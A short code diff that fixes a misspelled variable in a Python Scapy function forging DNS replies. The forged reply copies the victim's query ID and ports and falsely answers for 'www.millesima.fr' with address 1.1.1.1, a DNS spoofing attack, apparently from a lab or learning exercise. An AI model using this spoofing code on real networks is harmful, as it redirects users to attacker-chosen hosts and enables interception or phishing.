@@ -21,7 +21,7 @@ def dns_reply(pkt):
     send(spoofed_pkt)
 
 def dns_crequest(pkt):
-    poofed_pkt = IP(dst=pkt[IP].dst, src=pkt[IP].src)/\
+    spoofed_pkt = IP(dst=pkt[IP].dst, src=pkt[IP].src)/\
         UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport)/\
         DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
         an=DNSRR(rrname="www.millesima.fr", ttl=100, rdata='1.1.1.1'))
